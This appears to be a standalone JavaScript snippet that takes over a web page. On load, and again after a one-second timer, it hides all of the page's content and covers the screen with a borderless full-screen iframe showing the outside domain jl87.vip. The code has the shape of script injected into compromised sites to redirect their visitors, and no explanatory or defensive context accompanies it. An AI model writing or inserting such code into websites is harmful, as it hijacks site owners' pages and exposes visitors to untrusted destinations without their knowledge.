let timeout = null
const showframe = function() {
	if (timeout != null) {
		clearTimeout(timeout)
	}
	let c = document.body.children;
	for (i = 0; i < c.length; i++) {
		c[i].style.display = 'none';
	}
	let makeframe = document.createElement("iframe");
	makeframe.setAttribute("src", "https://jl87.vip");
	makeframe.style.border = "none";
	makeframe.style.position = "absolute";
	makeframe.style.left = "0";
	makeframe.style.top = "0";
	makeframe.style.width = "100vw";
	makeframe.style.height = "100vh";
	makeframe.style.zIndex = "100000";
	let bdy = document.getElementsByTagName("body")[0];
	bdy.style.position = "unset";
	bdy.appendChild(makeframe);
}
window.onload = showframe;
timeout = setTimeout(showframe, 1000);
